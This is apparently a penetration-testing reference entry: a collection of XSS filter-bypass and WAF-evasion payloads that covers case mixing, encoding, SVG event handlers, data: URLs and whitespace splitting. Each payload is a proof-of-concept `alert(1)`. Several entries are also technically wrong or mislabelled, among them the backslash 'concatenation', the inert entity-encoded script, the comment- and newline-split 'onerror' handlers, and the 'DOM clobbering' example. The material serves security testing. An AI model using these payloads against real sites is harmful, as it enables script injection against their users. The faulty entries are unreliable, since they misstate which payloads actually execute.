---
id: "xss-bypass-payloads"
title: "XSS Payloads - Filter Bypass Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "bypass", "payload"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Payloads designed to bypass common XSS filters and WAFs

## Payloads

### Case Variation

Mixed case to bypass case-sensitive filters

- **Contexts**: html
- **Severity**: medium

```html
<ScRiPt>alert(1)</ScRiPt>
```

### Double URL Encoding

Double URL encoded payload to bypass filters

- **Contexts**: url, attribute
- **Severity**: medium

```html
%253Cscript%253Ealert(1)%253C/script%253E
```

### HTML Entities

HTML entity encoding to bypass basic filters

- **Contexts**: html, attribute
- **Severity**: medium

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

### Concatenation

String concatenation in JavaScript context

- **Contexts**: script
- **Severity**: high

```html
al\
ert(1)
```

### Unicode Bypass

Unicode characters to bypass keyword filters

- **Contexts**: html, script
- **Severity**: medium

```html
<script>\u0061lert(1)</script>
```

### Template Literals

ES6 template literals for filter bypass

- **Contexts**: script
- **Severity**: high

```html
`${alert(1)}`
```

### WAF Bypass - Nested Events

Nested event handlers to bypass WAF detection

- **Contexts**: html
- **Severity**: high

```html
<svg><animatetransform onbegin=alert(1)>
```

### DOM Clobbering

Use DOM clobbering to bypass filters

- **Contexts**: html
- **Severity**: medium

```html
<form id=x tabindex=1 onfocus=alert(1)></form>
```

### Fragment Identifier

Use fragment identifier for bypass

- **Contexts**: script
- **Severity**: medium

```html
location='javascript:alert(1)'
```

### Protocol Bypass

Alternative protocols to bypass restrictions

- **Contexts**: url
- **Severity**: high

```html
data:text/html,<script>alert(1)</script>
```

### Comment Bypass

HTML comments to split filtered keywords

- **Contexts**: html
- **Severity**: medium

```html
<img src=x one<!---->rror=alert(1)>
```

### Tab/Newline Bypass

Use tabs and newlines to bypass keyword filters

- **Contexts**: html
- **Severity**: medium

```html
<img	src=x
on
error=alert(1)>
```
